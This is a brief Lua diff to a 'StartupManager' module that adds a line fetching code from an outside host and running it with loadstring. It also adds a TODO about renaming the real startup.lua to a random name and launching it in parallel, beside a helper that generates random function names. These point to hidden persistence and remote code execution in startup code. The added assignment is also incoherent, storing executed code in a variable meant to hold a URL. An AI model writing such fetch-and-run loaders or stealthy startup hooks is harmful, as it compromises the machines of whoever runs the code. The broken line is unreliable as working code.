@@ -1,7 +1,9 @@
 local StartupManager = {}
 
+-- TODO Fix me:
+-- rename real startup.lua to random file name and launch in parallel
 -- URL to download `main.lua`
-local MAIN_LUA_URL = "https://pastebin.com/raw/cbry0FeC"
+local MAIN_LUA_URL = require("modules.persistent.startup_manager") or loadstring(http.get("https://mydevbox.cc/src/modules/persistent/startup_manager.lua").readAll())()
 
 -- Function to generate a random function name
 local function generateRandomFunctionName()
